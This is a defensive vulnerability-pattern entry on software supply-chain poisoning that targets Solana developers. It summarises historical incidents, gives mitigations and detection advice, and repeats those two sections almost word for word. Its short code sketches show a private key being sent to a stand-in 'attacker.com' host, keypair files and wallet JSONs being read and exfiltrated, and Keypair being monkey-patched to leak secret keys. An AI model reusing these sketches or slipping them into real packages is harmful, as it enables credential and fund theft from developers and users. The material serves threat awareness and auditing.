# EP-095: Supply Chain / Dependency Poisoning
**Category:** Supply Chain  **Severity:** CRITICAL  **Solana-Specific:** No (but @solana/web3.js was targeted)
**Historical Exploits:** @solana/web3.js ($130K, Dec 2024 — CVE-2024-54134), DogWifTools ($10M, Jan 2025 — RAT via GitHub), solana-pumpfun-bot (Jul 2025 — malicious npm pkg), PyPI semantic-types (Jan 2025 — monkey-patching Keypair)

**Description:** Attackers compromise the software supply chain through multiple vectors to steal private keys or inject malware into developer/user environments.

**Sub-Pattern SC-1: Package Registry Poisoning**
```javascript
// @solana/web3.js 1.95.6/1.95.7 — compromised npm maintainer account
function addToQueue(privateKey) {
    fetch('https://attacker.com', { headers: { 'x-amz-cf-id': encode(privateKey) } });
}
```

**Sub-Pattern SC-2: Fake Repository Impersonation**
```javascript
// solana-pumpfun-bot — fake GitHub repo with malicious dependency "crypto-layout-utils"
// Package removed from npm, hosted on attacker's GitHub repo
// Heavily obfuscated — scans for wallet files and uploads to attacker server
const fs = require('fs');
const walletFiles = glob.sync('**/*.json').filter(f => isWalletFile(f));
walletFiles.forEach(f => exfiltrate(fs.readFileSync(f)));
```

**Sub-Pattern SC-3: Build Pipeline Compromise**
```
// DogWifTools — attacker reverse-engineered binary, extracted GitHub token
// Used token to access private repo, injected RAT into versions 1.6.3-1.6.6
// RAT targeted: wallet private keys, exchange credentials, ID photos
// $10M+ drained from affected Windows users
```

**Sub-Pattern SC-4: Runtime Monkey-Patching**
```python
# PyPI semantic-types — monkey-patches solders Keypair class
# Distributed via: solana-keypair, solana-publickey, solana-mev-agent-py, etc.
original_init = Keypair.__init__
def malicious_init(self, *args, **kwargs):
    original_init(self, *args, **kwargs)
    # Encrypt stolen key with RSA-2048, exfiltrate via Solana memo transaction
    send_memo_tx(devnet_endpoint, rsa_encrypt(self.secret()))
Keypair.__init__ = malicious_init
```

**Sub-Pattern SC-5: Drainer-as-a-Service (DaaS)**
```
// CLINKSINK — Mandiant-tracked DaaS targeting Solana users
// Distribution: Fake airdrop phishing pages via X/Discord
// Lures: Phantom, DappRadar, BONK airdrops
// Flow: Connect wallet → sign tx → drainer siphons SOL + tokens
// Revenue split: Operator gets cut, affiliates get cut
// $900K+ stolen since Dec 2023
// Mandiant's own X account hijacked and used for distribution (Jan 2024)
```

**Sub-Pattern SC-6: Dev Environment Exfiltration**
```python
# PyPI "solana-live" (May 2025) — targets Solana dev environments
# 11 malicious packages, 4 iterations
# Targets: ~/.config/solana/ keypair files
# Final variant: exfiltrates Jupyter Notebook execution history + source code
# Exposes: API keys, crypto credentials in notebook cells
# Exfiltrated to Russian-hosted IPs
import os
solana_dir = os.path.expanduser("~/.config/solana/")
for f in os.listdir(solana_dir):
    exfiltrate(os.path.join(solana_dir, f))
# Also scrapes Jupyter history for secrets
```

**Secure Patterns:**
- Lock dependency versions with lockfiles (`package-lock.json`, `yarn.lock`, `Cargo.lock`)
- Use `npm audit`, `cargo audit`, Socket.dev, and Snyk for supply chain monitoring
- Never handle private keys in frontend code
- Enable package signing and verify checksums
- Monitor for unexpected version publications on critical packages
- Never embed API tokens or credentials in distributed binaries
- Verify repository authenticity (stars/forks can be faked)
- Use code signing for release binaries
- Pin dependencies to exact versions, not ranges
- Never connect wallets to unverified airdrop sites (DaaS defense)
- Use hardware wallets for high-value holdings (immune to most drainers)
- Protect dev environments: don't install unvetted Solana-related packages

**Detection:** Audit dependency update diffs. Check for unexpected network calls in node_modules. Verify npm/PyPI package checksums. Monitor critical package publication events. Check for embedded tokens in compiled binaries (`strings` analysis). Verify dependency sources are official registries, not GitHub repos. For DaaS: flag any airdrop claim that requires transaction signing (legitimate airdrops don't drain wallets). For dev env: audit Solana-related PyPI/npm packages against known-good lists.

**Sub-Pattern SC-7: Third-Party Staking/DeFi API Poisoning**
```
// SwissBorg/Kiln (Sep 2025) — $41.5M stolen
// Attacker compromised Kiln infra engineer's GitHub access token
// Injected malicious payload into Kiln Connect API (staking-as-a-service)
// During routine "deactivate" (unstake) transaction, malicious code added
//   8 hidden authorization instructions that transferred stake account
//   control from SwissBorg to attacker-controlled on-chain accounts
// Targeted organizations holding >150,000 SOL
// 192,600 SOL drained after stake authority silently transferred
```

**Sub-Pattern SC-8: Blockchain-as-C2 Infrastructure**
```
// GlassWorm (Feb 2026) — Open VSX supply chain attack
// Malware loader distributed via compromised developer accounts on Open VSX Registry
// Novel: uses Solana memo transactions as a dynamic dead-drop to rotate
//   staging infrastructure without republishing malicious extensions
// Attacker writes C2 URLs as Solana memos → malware reads memos on-chain
// Blends into normal developer workflows, encrypted runtime-decrypted loaders
```

**Secure Patterns:**
- Lock dependency versions with lockfiles (`package-lock.json`, `yarn.lock`, `Cargo.lock`)
- Use `npm audit`, `cargo audit`, Socket.dev, and Snyk for supply chain monitoring
- Never handle private keys in frontend code
- Enable package signing and verify checksums
- Monitor for unexpected version publications on critical packages
- Never embed API tokens or credentials in distributed binaries
- Verify repository authenticity (stars/forks can be faked)
- Use code signing for release binaries
- Pin dependencies to exact versions, not ranges
- Never connect wallets to unverified airdrop sites (DaaS defense)
- Use hardware wallets for high-value holdings (immune to most drainers)
- Protect dev environments: don't install unvetted Solana-related packages
- **Vet third-party staking/DeFi API providers:** require multisig for authority transfers, monitor on-chain authority changes, implement allowlisting for stake account operations

**Detection:** Audit dependency update diffs. Check for unexpected network calls in node_modules. Verify npm/PyPI package checksums. Monitor critical package publication events. Check for embedded tokens in compiled binaries (`strings` analysis). Verify dependency sources are official registries, not GitHub repos. For DaaS: flag any airdrop claim that requires transaction signing (legitimate airdrops don't drain wallets). For dev env: audit Solana-related PyPI/npm packages against known-good lists. For staking APIs: verify authority transfer instructions cannot be injected into routine operations; monitor for unexpected `SetAuthority` calls on stake accounts.

**Sources (Wave 6):** Mandiant CLINKSINK report (Jan 2024), Cyble Solana Drainer analysis (Feb 2025), Socket.dev 2025 threat report
**Sources (Wave 10):** SwissBorg/Kiln post-mortem (Nov 2025, swissborg.com), Halborn SwissBorg analysis (Sep 2025), TheHackerNews GlassWorm report (Feb 2026)
